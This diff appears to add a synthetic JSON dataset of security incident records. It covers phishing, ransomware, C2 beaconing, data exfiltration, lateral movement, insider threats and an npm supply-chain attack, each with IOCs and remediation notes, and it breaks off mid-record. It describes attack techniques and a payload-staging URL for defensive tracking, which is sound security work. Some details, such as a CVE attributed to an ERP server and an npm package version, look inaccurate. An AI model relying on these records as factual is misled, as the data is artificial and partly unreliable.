@@ -1,0 +1,744 @@
+[
+  {
+    "id": "INC-001",
+    "title": "Phishing campaign targeting finance team — credential harvesting",
+    "description": "Multiple finance employees reported receiving emails from spoofed domain finance-secure-login.com containing a link to a fake Microsoft 365 login page hosted at 198.51.100.44. At least 3 users entered credentials. The phishing kit was served from http://198.51.100.44/m365/login.php. Email headers showed origination from 203.0.113.12. MX inspection confirmed the domain has no SPF record.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "finance-secure-login.com"},
+      {"type": "ipv4",   "value": "198.51.100.44"},
+      {"type": "ipv4",   "value": "203.0.113.12"},
+      {"type": "url",    "value": "http://198.51.100.44/m365/login.php"}
+    ],
+    "tags": ["phishing", "credential-harvesting", "finance", "spear-phishing"],
+    "resolution_notes": "Compromised accounts force-reset via Azure AD. Conditional Access policy enforcing MFA for all finance users deployed. finance-secure-login.com and 198.51.100.44 blocked at email gateway and proxy. User awareness training pushed to affected department. SPF/DMARC enforcement enabled for corporate domain.",
+    "created_at": "2026-01-05T08:14:00Z",
+    "resolved_at": "2026-01-05T16:30:00Z"
+  },
+  {
+    "id": "INC-002",
+    "title": "Spear-phishing targeting HR — W-2 fraud attempt",
+    "description": "HR director received an email from payroll-update.net impersonating the CFO, requesting W-2 exports for all employees. The email was sent from 203.0.113.55 and contained a malicious PDF attachment (SHA256: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2). The PDF dropped a credential stealer. No data was exfiltrated.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain",  "value": "payroll-update.net"},
+      {"type": "ipv4",    "value": "203.0.113.55"},
+      {"type": "sha256",  "value": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"}
+    ],
+    "tags": ["phishing", "spear-phishing", "hr", "w2-fraud", "pdf-malware"],
+    "resolution_notes": "PDF quarantined and deleted from mailbox. payroll-update.net blocked at DNS gateway. HR director credentials rotated. Email security rule added to flag external emails impersonating executives. DLP rule added to alert on W-2 export requests via email.",
+    "created_at": "2026-01-18T10:00:00Z",
+    "resolved_at": "2026-01-18T14:45:00Z"
+  },
+  {
+    "id": "INC-003",
+    "title": "Mass phishing wave — credential portal on 198.51.100.44",
+    "description": "SIEM correlated 47 inbound emails linking to http://198.51.100.44/portal/sso over a 2-hour window. The domain sender rotated across acme-secure.net and corp-auth-portal.com, both registered within 24 hours. 11 users clicked; 4 entered credentials. The phishing kit reuses the same hosting IP as INC-001.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "198.51.100.44"},
+      {"type": "domain", "value": "acme-secure.net"},
+      {"type": "domain", "value": "corp-auth-portal.com"},
+      {"type": "url",    "value": "http://198.51.100.44/portal/sso"}
+    ],
+    "tags": ["phishing", "credential-harvesting", "bulk-campaign", "repeat-infrastructure"],
+    "resolution_notes": "198.51.100.44 firewalled at perimeter. All 4 compromised accounts suspended and passwords reset with MFA re-enrolment required. acme-secure.net and corp-auth-portal.com added to threat intel block list. Threat intel team flagged 198.51.100.44 as known phishing host (cross-reference INC-001).",
+    "created_at": "2026-02-10T13:00:00Z",
+    "resolved_at": "2026-02-10T17:30:00Z"
+  },
+  {
+    "id": "INC-004",
+    "title": "Phishing link delivered via Teams — OAuth token theft",
+    "description": "An external Teams message sent a link to http://corp-auth-portal.com/oauth/authorize?client_id=teams pointing to a malicious OAuth consent page. Two employees granted consent, exposing read access to their mailboxes. The sending account originated from 198.51.100.77.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "corp-auth-portal.com"},
+      {"type": "ipv4",   "value": "198.51.100.77"},
+      {"type": "url",    "value": "http://corp-auth-portal.com/oauth/authorize"}
+    ],
+    "tags": ["phishing", "oauth-abuse", "teams", "token-theft"],
+    "resolution_notes": "Revoked delegated OAuth tokens for both affected accounts. corp-auth-portal.com blocked at proxy. Azure AD audit logs reviewed for further anomalous app grants; none found. External Teams messaging policy restricted to known partner tenants.",
+    "created_at": "2026-03-02T09:30:00Z",
+    "resolved_at": "2026-03-02T13:00:00Z"
+  },
+  {
+    "id": "INC-005",
+    "title": "CEO fraud phishing — wire transfer attempt",
+    "description": "CFO received a lookalike email from acme-finance.co (not acme-finance.com) requesting an urgent $85,000 wire transfer. The sending IP was 203.0.113.80. The email bypassed the spam filter due to high domain reputation score from a recently purchased aged domain. CFO escalated to SOC before initiating transfer.",
+    "severity": "medium",
+    "status": "closed",
+    "iocs": [
+      {"type": "domain", "value": "acme-finance.co"},
+      {"type": "ipv4",   "value": "203.0.113.80"}
+    ],
+    "tags": ["phishing", "bec", "ceo-fraud", "wire-transfer"],
+    "resolution_notes": "No financial loss. acme-finance.co blocked and reported to registrar. Email security vendor updated with lookalike domain rule. Finance team briefed on wire transfer verification procedure (call-back policy). DMARC alignment review completed for all corporate domains.",
+    "created_at": "2026-03-15T11:20:00Z",
+    "resolved_at": "2026-03-15T15:00:00Z"
+  },
+  {
+    "id": "INC-006",
+    "title": "Ransomware — LockBit variant encrypted file shares",
+    "description": "At 02:17 UTC endpoint detection on WKSTN-042 triggered on process lsass.exe dumping credentials followed immediately by lateral movement via SMB to FILE-SERVER-01. Within 20 minutes, 14,000 files on \\\\FILE-SERVER-01\\shares were encrypted with extension .lockbit. Ransom note DROP_HERE.txt left in every directory. Initial vector confirmed as macro-enabled Word document SHA1: deadbeef1234deadbeef1234deadbeef12345678. C2 comms observed to 192.0.2.88 on port 443.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",  "value": "192.0.2.88"},
+      {"type": "sha1",  "value": "deadbeef1234deadbeef1234deadbeef12345678"},
+      {"type": "md5",   "value": "aabbccddeeff00112233445566778899"}
+    ],
+    "tags": ["ransomware", "lockbit", "file-encryption", "smb-lateral-movement", "lsass-dump"],
+    "resolution_notes": "WKSTN-042 and FILE-SERVER-01 isolated immediately. Backups from 2026-01-14 restored — 3 hours of data loss accepted. Compromised AD account (svc_backup) password rotated and privilege reviewed. 192.0.2.88 blocked at firewall. EDR signature deployed for lockbit dropper hash. Post-incident: SMB signing enforced across all servers.",
+    "created_at": "2026-01-15T02:17:00Z",
+    "resolved_at": "2026-01-16T10:00:00Z"
+  },
+  {
+    "id": "INC-007",
+    "title": "Ransomware pre-deployment — Cobalt Strike beacon detected",
+    "description": "EDR flagged a Cobalt Strike beacon on WKSTN-089 communicating to 192.0.2.88 on port 443 with JARM fingerprint matching known ransomware infrastructure. Memory forensics revealed staged ransomware binary (MD5: aabbccddeeff00112233445566778899) in C:\\Windows\\Temp. Network scan initiated from WKSTN-089 against internal /16 subnet.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "192.0.2.88"},
+      {"type": "md5",  "value": "aabbccddeeff00112233445566778899"}
+    ],
+    "tags": ["ransomware", "cobalt-strike", "pre-ransomware", "beacon", "staged-payload"],
+    "resolution_notes": "WKSTN-089 isolated within 8 minutes of alert. Staged binary deleted. Memory forensics confirmed no additional persistence mechanisms. 192.0.2.88 and known CS team server IPs blocked enterprise-wide. Network scan source quarantined. No encryption occurred — incident contained in pre-deployment phase.",
+    "created_at": "2026-02-20T14:05:00Z",
+    "resolved_at": "2026-02-20T18:30:00Z"
+  },
+  {
+    "id": "INC-008",
+    "title": "Ransomware — BlackCat/ALPHV hit legacy ERP server",
+    "description": "SIEM alerted on mass file rename events on ERP-SERVER-02 at 23:40 UTC. Investigation found BlackCat ransomware binary (SHA256: f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2) executed under SYSTEM context. C2 traffic to 192.0.2.201 and 192.0.2.202 observed. The ERP server was unpatched (CVE-2024-21413). All 220 GB of ERP data encrypted.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "192.0.2.201"},
+      {"type": "ipv4",   "value": "192.0.2.202"},
+      {"type": "sha256", "value": "f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4b5a6f1e2"}
+    ],
+    "tags": ["ransomware", "blackcat", "alphv", "erp", "unpatched-system", "cve-2024-21413"],
+    "resolution_notes": "ERP server isolated and rebuilt from clean image. Backup restore completed (12-hour RPO). CVE-2024-21413 patched. 192.0.2.201 and 192.0.2.202 added to firewall deny list. Emergency patching sprint initiated for all servers older than 90 days on patch cycle.",
+    "created_at": "2026-03-08T23:40:00Z",
+    "resolved_at": "2026-03-10T08:00:00Z"
+  },
+  {
+    "id": "INC-009",
+    "title": "Ransomware — double extortion, data exfil before encryption",
+    "description": "Ransomware group encrypted DEV-SERVER-03 and posted a data sample to their leak site. Prior to encryption, 4.2 GB of source code was exfiltrated via SFTP to 192.0.2.88. Exfil started 6 hours before encryption. The initial access was a valid VPN credential obtained through phishing (see INC-001 credential overlap).",
+    "severity": "critical",
+    "status": "in_progress",
+    "iocs": [
+      {"type": "ipv4",  "value": "192.0.2.88"},
+      {"type": "ipv4",  "value": "192.0.2.201"}
+    ],
+    "tags": ["ransomware", "double-extortion", "data-exfil", "source-code", "vpn-abuse"],
+    "resolution_notes": "DEV-SERVER-03 isolated. Legal and PR engaged for breach notification assessment. SFTP logs collected for forensics. VPN access suspended for all accounts pending re-authentication. Cross-reference with INC-001 phishing credential breach.",
+    "created_at": "2026-04-01T06:00:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-010",
+    "title": "Ransomware recovery exercise — backup integrity validated",
+    "description": "Following INC-006 and INC-008, the IR team conducted a tabletop and live restore exercise. During testing, the backup agent on BACKUP-01 communicated to 192.0.2.202 during a restore job — flagged by IDS. Investigation determined the backup software phoned home to a telemetry endpoint that matched a known ransomware C2 IP added in INC-008.",
+    "severity": "low",
+    "status": "closed",
+    "iocs": [
+      {"type": "ipv4", "value": "192.0.2.202"}
+    ],
+    "tags": ["ransomware", "false-positive", "backup", "telemetry-overlap"],
+    "resolution_notes": "Confirmed false positive: backup software telemetry coincidentally matches a blocked IP range. Backup software updated to use internal proxy for telemetry. Firewall rule scoped to block /32 rather than /24 to reduce collision risk. No ransomware activity detected.",
+    "created_at": "2026-04-10T10:00:00Z",
+    "resolved_at": "2026-04-10T12:00:00Z"
+  },
+  {
+    "id": "INC-011",
+    "title": "C2 beaconing — unknown implant on WKSTN-101",
+    "description": "Network monitoring detected periodic HTTPS beaconing from WKSTN-101 to 203.0.113.100 every 60 seconds with a 5-second jitter. TLS certificate CN=update.microsoft-cdn.net (self-signed). The process responsible was svchost.exe running under a non-standard service key HKLM\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateHelper. Binary SHA256: ccddee001122ccddee001122ccddee001122ccddee001122ccddee001122ccddee.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "203.0.113.100"},
+      {"type": "domain", "value": "update.microsoft-cdn.net"},
+      {"type": "sha256", "value": "ccddee001122ccddee001122ccddee001122ccddee001122ccddee001122ccddee"}
+    ],
+    "tags": ["c2-beaconing", "implant", "persistence", "registry", "ssl-mimicry"],
+    "resolution_notes": "WKSTN-101 isolated and re-imaged. Malicious service key removed from registry. 203.0.113.100 and update.microsoft-cdn.net blocked. Binary submitted to sandbox — confirmed C2 implant with keylogging capability. User account on WKSTN-101 had credentials rotated. Threat intel shared with ISAC.",
+    "created_at": "2026-01-22T09:00:00Z",
+    "resolved_at": "2026-01-23T11:00:00Z"
+  },
+  {
+    "id": "INC-012",
+    "title": "C2 beaconing — DNS tunneling to malicious resolver",
+    "description": "DNS query logs showed WKSTN-055 making TXT record queries to randomstring.c2tunnel-exfil.com at 30-second intervals. Approximately 2 KB/query of encoded data embedded in subdomains. Authoritative resolver was 203.0.113.100. The binary responsible matched SHA1: c0ffee1234c0ffee1234c0ffee1234c0ffee1234.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "203.0.113.100"},
+      {"type": "domain", "value": "c2tunnel-exfil.com"},
+      {"type": "sha1",   "value": "c0ffee1234c0ffee1234c0ffee1234c0ffee1234"}
+    ],
+    "tags": ["c2-beaconing", "dns-tunneling", "data-exfil", "covert-channel"],
+    "resolution_notes": "WKSTN-055 isolated. DNS recursive resolver updated to block c2tunnel-exfil.com and wildcard TLD. 203.0.113.100 blocked at firewall. Binary analysed — confirmed SliversC2 variant with DNS channel. All DNS traffic now routed through internal RPZ-enabled resolver.",
+    "created_at": "2026-02-14T15:00:00Z",
+    "resolved_at": "2026-02-15T09:00:00Z"
+  },
+  {
+    "id": "INC-013",
+    "title": "C2 beaconing — periodic HTTP check-in to fast-flux domain",
+    "description": "Proxy logs showed WKSTN-033 making HTTP GET requests to update.microsoft-cdn.net/check-in every 120 seconds. The domain resolved to multiple IPs rotating through 203.0.113.100, 203.0.113.101, and 203.0.113.102 (fast-flux). User agent was Mozilla/5.0 (compatible; bot/1.0). No payload observed in POST responses, suggesting a dormant implant awaiting tasking.",
+    "severity": "medium",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "update.microsoft-cdn.net"},
+      {"type": "ipv4",   "value": "203.0.113.100"},
+      {"type": "ipv4",   "value": "203.0.113.101"},
+      {"type": "ipv4",   "value": "203.0.113.102"}
+    ],
+    "tags": ["c2-beaconing", "fast-flux", "dormant-implant", "http-beacon"],
+    "resolution_notes": "WKSTN-033 isolated and re-imaged. Fast-flux domain added to DNS sinkhole. All three IPs firewalled. Memory forensics confirmed the implant but found no data staged for exfil. Reviewed all proxy logs for the same user agent pattern — no other hosts affected.",
+    "created_at": "2026-02-28T11:00:00Z",
+    "resolved_at": "2026-03-01T08:00:00Z"
+  },
+  {
+    "id": "INC-014",
+    "title": "C2 beaconing — ICMP tunneling on corporate workstation",
+    "description": "IDS signature triggered on oversized ICMP echo-reply packets (payload > 1400 bytes) from WKSTN-077 to 203.0.113.102. Packet capture showed base64-encoded commands in ICMP payload. The host had a suspicious startup item pointing to C:\\ProgramData\\MicrosoftHelper\\helper.exe (SHA256: ccddee001122ccddee001122ccddee001122ccddee001122ccddee001122ccddee — same hash as INC-011).",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "203.0.113.102"},
+      {"type": "sha256", "value": "ccddee001122ccddee001122ccddee001122ccddee001122ccddee001122ccddee"}
+    ],
+    "tags": ["c2-beaconing", "icmp-tunneling", "shared-implant", "covert-channel"],
+    "resolution_notes": "WKSTN-077 isolated. Startup item and binary deleted. 203.0.113.102 blocked. Cross-reference with INC-011 confirmed same implant family reused across two hosts — elevated to threat hunting exercise across all endpoints. Firewall updated to drop oversized ICMP packets at perimeter.",
+    "created_at": "2026-03-05T14:30:00Z",
+    "resolved_at": "2026-03-06T10:00:00Z"
+  },
+  {
+    "id": "INC-015",
+    "title": "C2 beaconing — suspected APT implant long-dwell-time",
+    "description": "Threat hunting identified WKSTN-019 had been beaconing to c2tunnel-exfil.com for an estimated 45 days before detection. Beacon interval was irregular (30–300 s) to evade ML detectors. Total estimated data egress: 190 MB via DNS. The implant ran as a DLL loaded by a hijacked msdtc.exe process.",
+    "severity": "critical",
+    "status": "in_progress",
+    "iocs": [
+      {"type": "domain", "value": "c2tunnel-exfil.com"},
+      {"type": "ipv4",   "value": "203.0.113.100"}
+    ],
+    "tags": ["c2-beaconing", "apt", "long-dwell-time", "dll-hijacking", "dns-tunneling"],
+    "resolution_notes": "WKSTN-019 forensic image taken and host re-imaged. Full DLL hijacking investigation on msdtc.exe across all servers underway. Threat intel engaged to attribute the implant. 190 MB egress being reviewed for sensitive data content.",
+    "created_at": "2026-04-05T09:00:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-016",
+    "title": "Data exfiltration — customer PII uploaded to Mega.nz",
+    "description": "DLP alert fired when WKSTN-066 attempted to upload a 340 MB archive (customers_export_2026.zip) to upload.mega.nz. The user, a sales analyst, had downloaded the full customers table from CRM 2 hours earlier. No authorisation was on file. Upload was blocked by proxy DLP policy.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "upload.mega.nz"},
+      {"type": "ipv4",   "value": "185.0.0.123"}
+    ],
+    "tags": ["data-exfil", "pii", "insider-adjacent", "dlp-block", "cloud-storage-abuse"],
+    "resolution_notes": "Upload confirmed blocked — no data reached external storage. User account suspended pending HR investigation. CRM download policy tightened: exports > 10,000 rows require manager approval workflow. upload.mega.nz domain added to proxy block list for all non-approved users.",
+    "created_at": "2026-01-28T14:00:00Z",
+    "resolved_at": "2026-01-29T10:00:00Z"
+  },
+  {
+    "id": "INC-017",
+    "title": "Data exfiltration — source code pushed to personal GitHub",
+    "description": "SIEM correlated git push events from DEV-WKSTN-011 to github.com (192.30.255.113) for a repository not in the corporate GitHub org. The developer pushed 3 proprietary microservice repositories totalling 1.2 GB over 48 hours. The developer's account had recently submitted a resignation.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "domain", "value": "github.com"},
+      {"type": "ipv4",   "value": "192.30.255.113"}
+    ],
+    "tags": ["data-exfil", "source-code", "insider-threat", "github", "offboarding"],
+    "resolution_notes": "GitHub DMCA takedown request filed for the three repositories. Developer's access revoked immediately. Legal counsel engaged. DLP rule added to alert on git pushes to non-corporate remotes from corporate devices. Offboarding checklist updated to revoke GitHub access on resignation notice.",
+    "created_at": "2026-02-05T09:00:00Z",
+    "resolved_at": "2026-02-07T15:00:00Z"
+  },
+  {
+    "id": "INC-018",
+    "title": "Data exfiltration — SFTP bulk transfer of financial records",
+    "description": "Firewall logs captured a 2.1 GB SFTP transfer from FINANCE-WS-003 to 185.0.0.200 (external FTP server registered in a high-risk jurisdiction) at 03:00 UTC. The transfer occurred outside business hours. The user account svc_finance_reports was used. No scheduled task or business justification was found.",
+    "severity": "critical",
+    "status": "in_progress",
+    "iocs": [
+      {"type": "ipv4", "value": "185.0.0.200"}
+    ],
+    "tags": ["data-exfil", "financial-data", "after-hours", "sftp", "service-account-abuse"],
+    "resolution_notes": "svc_finance_reports account disabled. 185.0.0.200 blocked at firewall. Forensic investigation ongoing to determine whether transfer was malicious or misconfigured automation. No authorised business process found for this transfer destination.",
+    "created_at": "2026-03-20T03:00:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-019",
+    "title": "Data exfiltration — email forwarding rule to external address",
+    "description": "Azure AD audit log showed a forwarding rule created in the mailbox of an executive PA that forwarded all incoming mail to exfil.dump@protonmail.com. The rule was created from IP 185.0.0.123 — the same IP as INC-016. The rule had been active for 11 days before discovery.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",  "value": "185.0.0.123"},
+      {"type": "domain","value": "protonmail.com"}
+    ],
+    "tags": ["data-exfil", "email-forwarding", "mailbox-compromise", "executive-targeting"],
+    "resolution_notes": "Forwarding rule deleted. PA mailbox reviewed — 11 days of executive correspondence leaked. Executives briefed. PA account credentials rotated and MFA enforced. Conditional Access policy now blocks mailbox rule creation from non-managed IPs. Cross-reference with INC-016 (shared source IP 185.0.0.123).",
+    "created_at": "2026-02-01T11:00:00Z",
+    "resolved_at": "2026-02-01T16:00:00Z"
+  },
+  {
+    "id": "INC-020",
+    "title": "Data exfiltration — database dump via web shell",
+    "description": "WAF detected a POST request to /admin/shell.php on WEB-SERVER-04 containing a mysqldump command. The dump was then downloaded via HTTP from 185.0.0.200. Database dump contained 500,000 user records including hashed passwords and email addresses. The web shell (MD5: 11223344556677889900aabbccddeeff) was planted 3 weeks prior.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "185.0.0.200"},
+      {"type": "md5",  "value": "11223344556677889900aabbccddeeff"},
+      {"type": "url",  "value": "http://web-server-04/admin/shell.php"}
+    ],
+    "tags": ["data-exfil", "web-shell", "database-dump", "pii", "breach"],
+    "resolution_notes": "Web shell removed. WEB-SERVER-04 fully forensicated and rebuilt. 185.0.0.200 blocked. Breach notification process initiated (GDPR 72-hour requirement). Password reset email sent to 500,000 affected users. Web application firewall rules tightened; file upload validation improved. CVE audit completed for web stack.",
+    "created_at": "2026-03-25T22:00:00Z",
+    "resolved_at": "2026-03-28T18:00:00Z"
+  },
+  {
+    "id": "INC-021",
+    "title": "Lateral movement — pass-the-hash using stolen NTLM hashes",
+    "description": "IDS alert for Mimikatz-like credential extraction from WKSTN-010. The attacker used extracted NTLM hashes to authenticate to 6 additional servers via SMB (pass-the-hash). Lateral movement pivot chain: WKSTN-010 → FILE-01 → FILE-02 → DB-SERVER-01 → DC-02. Source IP of initial access: 198.51.100.200.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.200"}
+    ],
+    "tags": ["lateral-movement", "pass-the-hash", "mimikatz", "credential-theft", "smb"],
+    "resolution_notes": "All 6 laterally accessed servers audited and AD accounts rotated. Mimikatz indicators cleaned. SMB signing enforced across domain. Tiered admin model implemented — privileged accounts prohibited from logging into endpoints. KB2871997 and Protected Users group applied to all tier-0 accounts.",
+    "created_at": "2026-01-30T04:00:00Z",
+    "resolved_at": "2026-02-01T12:00:00Z"
+  },
+  {
+    "id": "INC-022",
+    "title": "Lateral movement — Kerberoasting leading to domain admin",
+    "description": "Threat hunter identified 4,300 Kerberos TGS requests for service accounts within a 10-minute window from WKSTN-077. The attacker cracked svc_sql_prod (weak password) and used it to authenticate to SQL-SERVER-02. From there, privilege escalation to domain admin via unconstrained Kerberos delegation. Origin IP: 198.51.100.200.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.200"}
+    ],
+    "tags": ["lateral-movement", "kerberoasting", "privilege-escalation", "domain-admin", "kerberos-delegation"],
+    "resolution_notes": "svc_sql_prod password rotated to 32-char random. All service accounts audited for weak passwords. Unconstrained delegation removed from SQL-SERVER-02. ATA/MDI alert tuning updated for Kerberoasting detection threshold. Silver ticket prevention via Protected Users added to service accounts.",
+    "created_at": "2026-02-18T10:00:00Z",
+    "resolved_at": "2026-02-19T16:00:00Z"
+  },
+  {
+    "id": "INC-023",
+    "title": "Lateral movement — RDP spray across internal subnet",
+    "description": "SIEM alerted on 2,000 RDP (port 3389) authentication attempts from ADMIN-WS-001 targeting the 10.10.0.0/24 subnet in under 5 minutes. The spray resulted in 3 successful logins to servers using a local admin account with the default password. Source workstation had been compromised via VPN from 198.51.100.200.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.200"}
+    ],
+    "tags": ["lateral-movement", "rdp-spray", "default-password", "internal-recon"],
+    "resolution_notes": "Three compromised servers isolated and audited. Default local admin password changed domain-wide via GPO. RDP access restricted to jump servers only. ADMIN-WS-001 re-imaged. VPN access from 198.51.100.200 revoked and IP blocked.",
+    "created_at": "2026-03-10T16:00:00Z",
+    "resolved_at": "2026-03-11T12:00:00Z"
+  },
+  {
+    "id": "INC-024",
+    "title": "Lateral movement — WMI execution used for payload delivery",
+    "description": "Carbon Black detected wmic.exe remotely executing a PowerShell one-liner on 8 hosts. The command downloaded a payload from http://198.51.100.200/stage2.ps1 and executed it in memory. WMIC authentication used compromised domain account from INC-022.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.200"},
+      {"type": "url",  "value": "http://198.51.100.200/stage2.ps1"}
+    ],
+    "tags": ["lateral-movement", "wmi", "powershell", "living-off-the-land", "payload-staging"],
+    "resolution_notes": "8 hosts isolated and re-imaged. stage2.ps1 payload analysed — Cobalt Strike stager. WMI firewall rules tightened: DCOM restricted to IT admin VLAN. Compromised domain account rotated. PowerShell execution policy set to AllSigned on all endpoints.",
+    "created_at": "2026-03-18T08:00:00Z",
+    "resolved_at": "2026-03-19T14:00:00Z"
+  },
+  {
+    "id": "INC-025",
+    "title": "Lateral movement — DCSync attack on domain controller",
+    "description": "MDI alert triggered on DC-01 for DCSync replication performed by a non-DC account (compromised svc_monitoring). The account had been granted DS-Replication-Get-Changes-All permission 2 days prior by a compromised admin account. The replication request came from 198.51.100.200. All krbtgt and domain admin NTLM hashes extracted.",
+    "severity": "critical",
+    "status": "in_progress",
+    "iocs": [
+      {"type": "ipv4", "value": "198.51.100.200"}
+    ],
+    "tags": ["lateral-movement", "dcsync", "domain-compromise", "krbtgt-exposure", "privilege-abuse"],
+    "resolution_notes": "krbtgt password rotated twice (golden ticket invalidation). All domain admin accounts suspended and credentials reset. Forest-wide audit of DS-Replication permissions underway. 198.51.100.200 blocked and tracked for attribution. CISO notified of potential domain-wide compromise.",
+    "created_at": "2026-04-08T05:00:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-026",
+    "title": "Insider threat — privileged user bulk-downloading HR records",
+    "description": "An HR system administrator, USER-HR-004, downloaded 18,500 employee personnel records outside business hours using a bulk export API not normally used for daily operations. The downloads occurred from 23:00–02:00 over 3 consecutive nights. No business justification was provided. User is in a performance improvement plan.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [],
+    "tags": ["insider-threat", "privilege-abuse", "hr-data", "after-hours-access", "bulk-download"],
+    "resolution_notes": "Account suspended. HR data export API rate-limited and audit-logged. Exported records flagged with watermarks for DLP tracking. HR VP and Legal briefed. User access terminated. UEBA baseline reviewed — anomaly score had been rising for 2 weeks before human review. UEBA alert threshold lowered.",
+    "created_at": "2026-02-22T08:00:00Z",
+    "resolved_at": "2026-02-24T17:00:00Z"
+  },
+  {
+    "id": "INC-027",
+    "title": "Insider threat — privileged admin creating backdoor accounts",
+    "description": "An IT administrator (SYSADMIN-007) created 3 dormant local administrator accounts on 11 production servers. The accounts were named with plausible service account names (svc_win_update1, svc_win_update2, svc_win_update3) and had no business purpose. SIEM correlated creation events at 01:00 UTC over two nights. The user had given notice of resignation.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [],
+    "tags": ["insider-threat", "backdoor-account", "offboarding", "privilege-abuse", "persistence"],
+    "resolution_notes": "11 servers audited. All 3 backdoor accounts removed. SYSADMIN-007 access revoked immediately. Legal hold placed on the user's workstation. Privileged account lifecycle automated: service account creation now requires ITSM approval ticket. Nightly automated audit of all local admin accounts implemented.",
+    "created_at": "2026-03-12T07:00:00Z",
+    "resolved_at": "2026-03-13T14:00:00Z"
+  },
+  {
+    "id": "INC-028",
+    "title": "Insider threat — data theft via USB to personal device",
+    "description": "DLP endpoint agent flagged a 1.4 GB copy to a USB mass storage device from WKSTN-050 containing the quarterly customer revenue report (PDF) and 3 years of sales pipeline data. The USB was not an approved encrypted device. The user (SALES-003) has a known grievance documented in HR records.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [],
+    "tags": ["insider-threat", "usb-exfil", "sales-data", "dlp", "physical-media"],
+    "resolution_notes": "WKSTN-050 USB port disabled via GPO. USB device serial number logged. Data classified as commercially sensitive — legal review initiated. SALES-003 placed on administrative leave. USB policy updated: only IT-issued encrypted USB drives permitted. DLP USB alert priority raised to P1.",
+    "created_at": "2026-03-28T14:30:00Z",
+    "resolved_at": "2026-03-29T11:00:00Z"
+  },
+  {
+    "id": "INC-029",
+    "title": "Insider threat — VPN access after termination",
+    "description": "PAM tool alerted that a terminated employee (TERM-USER-012, terminated 2026-03-01) authenticated via VPN at 2026-03-04 02:30 UTC using valid credentials that had not been revoked. The session lasted 22 minutes; file server access logs show READ operations on the product roadmap share.",
+    "severity": "high",
+    "status": "resolved",
+    "iocs": [],
+    "tags": ["insider-threat", "offboarding-failure", "vpn", "unauthorised-access", "terminated-user"],
+    "resolution_notes": "VPN session terminated. TERM-USER-012 account fully disabled in AD, Azure AD, and VPN. Product roadmap files audited — no evidence of download or modification. Offboarding process gap identified: VPN deprovisioning was manual and missed. IAM team automated VPN revocation as part of ITSM offboarding workflow.",
+    "created_at": "2026-03-04T02:30:00Z",
+    "resolved_at": "2026-03-04T10:00:00Z"
+  },
+  {
+    "id": "INC-030",
+    "title": "Insider threat — UEBA flagged anomalous print volume",
+    "description": "UEBA platform flagged LEGAL-004 for printing 420 pages between 17:00–19:00, 10× their 90-day baseline. Documents printed included pending M&A term sheets and NDAs. The user had resigned the previous week. Physical inspection of the user's desk found no documents; assumed taken off-premises.",
+    "severity": "medium",
+    "status": "in_progress",
+    "iocs": [],
+    "tags": ["insider-threat", "ueba", "print-anomaly", "m-and-a", "sensitive-documents"],
+    "resolution_notes": "Legal counsel briefed on possible breach of NDA terms. HR investigating the user's departure circumstances. Printer access policy tightened for high-classification documents. M&A documents re-classified to require DRM protection before printing.",
+    "created_at": "2026-04-03T19:30:00Z",
+    "resolved_at": null
+  },
+  {
+    "id": "INC-031",
+    "title": "Supply chain attack — poisoned npm package installed in CI",
+    "description": "Dependency audit of the CI pipeline found that npm package event-stream@4.0.1 was replaced by a malicious version at the registry (sha256: 9988776655443322998877665544332299887766554433229988776655443322). The package contained an obfuscated payload that harvested environment variables (CI secrets) and posted them to 192.0.2.100 on package install.",
+    "severity": "critical",
+    "status": "resolved",
+    "iocs": [
+      {"type": "ipv4",   "value": "192.0.2.100"},
+      {"type": "sha256", "value": "9988776655443322998877665544332299887766554433229988776655443322"},
+      {"type": "domain", "value": "registry.npmjs.org"}
+    ],
+    "tags": ["supply-chain", "npm", "ci-cd", "secret-harvesting", "package-tampering"],
+    "resolution_notes": "Malicious npm package removed and package-lock.json pinned to safe version. All CI environment variables (AWS keys, signing certificates, deploy tokens) rotated. CI runners rebuilt from clean image. npm audit added as a mandatory gate in the pipeline. Vendor notified; npm registry abuse report filed.",
+    "created_at": "2026-01-20T10:00:00Z",
